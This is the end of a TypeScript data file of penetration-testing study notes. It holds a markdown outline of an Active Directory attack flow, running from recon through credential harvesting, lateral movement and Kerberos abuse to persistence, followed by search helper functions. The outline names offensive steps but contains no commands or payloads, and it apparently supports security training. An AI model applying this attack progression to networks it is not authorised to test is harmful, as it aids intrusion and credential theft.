    "content": "# Active Directory Pentesting Attack Flow\r\n\r\n```text\r\nPentesting Methodology\r\n│\r\n├── 01. Web Pentesting Playbook\r\n│      ├── HTTP Enumeration\r\n│      ├── Content Discovery\r\n│      ├── Authentication\r\n│      ├── Authorization\r\n│      ├── Injection\r\n│      ├── API Testing\r\n│      ├── File Handling\r\n│      ├── Business Logic\r\n│      ├── CMS Testing\r\n│      ├── Client-Side\r\n│      ├── WebSockets\r\n│      └── Post Exploitation\r\n│\r\n└── 02. Active Directory Playbook\r\n       ├── Domain Enumeration\r\n       ├── Kerberos\r\n       ├── Credential Abuse\r\n       ├── BloodHound\r\n       ├── Ticket Abuse\r\n       ├── Pivoting\r\n       └── Persistence\r\n```\r\n\r\n## Typical Attack Progression\r\n\r\n```text\r\nRecon\r\n   │\r\n   ▼\r\nUser Enumeration\r\n   │\r\n   ▼\r\nCredential Discovery\r\n   │\r\n   ▼\r\nInitial Foothold\r\n   │\r\n   ▼\r\nLocal Enumeration\r\n   │\r\n   ▼\r\nPrivilege Escalation\r\n   │\r\n   ▼\r\nCredential Harvesting\r\n   │\r\n   ▼\r\nLateral Movement\r\n   │\r\n   ▼\r\nActive Directory Enumeration\r\n   │\r\n   ▼\r\nDomain Administrator\r\n   │\r\n   ▼\r\nKerberos Abuse\r\n   │\r\n   ▼\r\nPersistence\r\n```\r\n",
    "headings": [],
    "commands": [],
    "tags": [
      "bloodhound",
      "kerberos",
      "persistence",
      "lateral movement"
    ],
    "size": 1250,
    "lineCount": 68
  }
];

// Backward compatibility alias for legacy components
export const NOTION_CPTS_NOTES = KNOWLEDGE_NOTES;

export function getKnowledgeNoteById(id: string): KnowledgeNoteItem | undefined {
  return KNOWLEDGE_NOTES.find((n) => n.id === id);
}

export function searchKnowledgeNotes(query: string, category?: string): KnowledgeNoteItem[] {
  let list = KNOWLEDGE_NOTES;
  if (category && category !== 'all') {
    list = list.filter((n) => n.category === category);
  }
  if (!query || !query.trim()) return list;

  const q = query.toLowerCase().trim();
  return list.filter(
    (n) =>
      n.title.toLowerCase().includes(q) ||
      n.category.toLowerCase().includes(q) ||
      (n.subcategory && n.subcategory.toLowerCase().includes(q)) ||
      n.tags.some((t) => t.includes(q)) ||
      n.content.toLowerCase().includes(q)
  );
}
